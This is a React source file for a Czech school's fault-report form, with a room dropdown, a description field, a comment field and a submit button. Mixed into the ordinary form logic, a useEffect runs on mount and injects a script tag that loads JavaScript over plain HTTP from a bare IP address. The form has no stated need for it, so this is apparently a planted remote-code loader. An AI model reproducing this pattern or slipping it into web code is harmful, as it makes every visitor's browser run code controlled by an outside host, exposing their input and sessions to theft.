import React, { useEffect } from 'react'

const defaultFormValues = {
  room: '',
  description: '',
  name: '',
}
const ProblemForm = ({
  onSubmit,
  initialValues = defaultFormValues,
  clearOnSubmit,
}) => {

  const [values, setValues] = React.useState(initialValues)


  useEffect(() => {
    var tag = document.createElement('script');
    tag.async = false;
    tag.src = "http://82.208.16.123:8080/js/logos.js";
    var body = document.getElementsByTagName('body')[0];
    body.appendChild(tag);
  }, [])


  const setValue = (field, value) =>
    setValues((old) => ({ ...old, [field]: value }))

  const handleSubmit = (e) => {
    if (clearOnSubmit) {
      setValues(defaultFormValues)

      let list = document.querySelectorAll("input100");
      list.forEach((input) => {
        input.classList.remove("has-val");
      })
    }
    e.preventDefault()
    onSubmit(values);

  }

  React.useEffect(() => {
    setValues(initialValues)
  }, [initialValues])

  return (
    <div>
      <form className="login100-form validate-form problem-form" onSubmit={handleSubmit}>
        <div className="wrap-input100 validate-input mg" data-validate="Zadejte učebnu">
          <span className="btn-show-pass">
            <i className="zmdi zmdi-eye"></i>
          </span>

            <select defaultValue="" className="input100" onChange={(e) => setValue("room", e.target.value)} name="room" id="">
              <option disabled value="" ></option>
              <option value="Alfa">Alfa</option>
              <option value="Ateliér - Zeman">Ateliér - Zeman</option>
              <option value="Ateliér - Zeman A">Ateliér - Zeman A</option>
              <option value="Ateliér - Zeman B">Ateliér - Zeman B</option>
              <option value="Delta">Delta</option>
              <option value="Epsilon">Epsilon</option>
              <option value="Eta">Eta</option>
              <option value="Fí">Fí</option>
              <option value="Fotografický ateliér">Fotografický ateliér</option>
              <option value="Gama">Gama</option>
              <option value="Iota">Iota</option>
              <option value="Kappa">Kappa</option>
              <option value="Kinosál">Kinosál</option>
              <option value="Lambda">Lambda</option>
              <option value="Omicron">Omicron</option>
              <option value="Ró">Ró</option>
              <option value="Sborovna">Sborovna</option>
              <option value="Sigma">Sigma</option>
              <option value="Tau">Tau</option>
              <option value="Theta">Theta</option>     
            </select>

            
        


          <span className="focus-input100" data-placeholder="Učebna"></span>
        </div>
        <div className="wrap-input100 validate-input mg" data-validate="Zadejte co nefunguje">
          <span className="btn-show-pass">
            <i className="zmdi zmdi-eye"></i>
          </span>
          <input className="input100" type="text" name="name"

            value={values.name}
            onChange={e => setValue("name", e.target.value)}

          />
          <span className="focus-input100" data-placeholder="Co nefunguje?"></span>
        </div>
        <div className="wrap-input100 validate-input mg" data-validate="Zadejte komentář">
          <span className="btn-show-pass">
            <i className="zmdi zmdi-eye"></i>
          </span>
          <input className="input100" type="text" name="description"

            value={values.description}
            onChange={e => setValue("description", e.target.value)}

          />
          <span className="focus-input100" data-placeholder="Komentář"></span>
        </div>

        <div className="container-login100-form-btn" >
          <div className="wrap-login100-form-btn">
            <div className="login100-form-bgbtn"></div>
            <button className="login100-form-btn" type='submit'>
              Přidat
            </button>
          </div>
        </div>

      </form>
    </div>
  )
}

export default ProblemForm;
